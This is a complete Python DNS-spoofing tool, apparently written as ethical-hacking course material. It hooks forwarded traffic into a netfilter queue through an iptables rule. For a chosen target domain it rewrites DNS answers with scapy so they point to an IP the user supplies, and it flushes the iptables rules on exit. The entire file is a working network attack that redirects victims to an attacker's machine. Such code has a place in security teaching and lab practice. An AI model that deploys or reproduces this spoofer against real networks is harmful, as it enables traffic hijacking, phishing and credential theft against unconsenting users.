#!/usr/bin/env python
import subprocess
import netfilterqueue
import scapy.all as scapy
import argparse

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Target website that you want to poison")
    parser.add_argument("-s", "--spoof", dest="spoof", help="IP that you want to spoof instead of showing the real website. Usually  your own machine")
    args = parser.parse_args()
    if not args.target:
        parser.error("No target provided, use --help")
    elif not args.spoof:
         parser.error("No spoof IP provided, use --help")
    return args

args = get_arguments()
# print(args.target, args.spoof)

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if args.target in qname:
            print("[+] Target site matched...spoofing")
            answer = scapy.DNSRR(rrname=qname, rdata=args.spoof)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.IP].len
            # del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            packet.set_payload(str(scapy_packet))
    packet.accept()


try:
    print("[+] Amening IP tables")
    subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 1", shell=True)
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(1, process_packet)
    queue.run()

except KeyboardInterrupt:
    print("\r\n[-] Detected CTRL + C.....Quitting and restoring IP tables")
    subprocess.call("iptables --flush", shell=True)

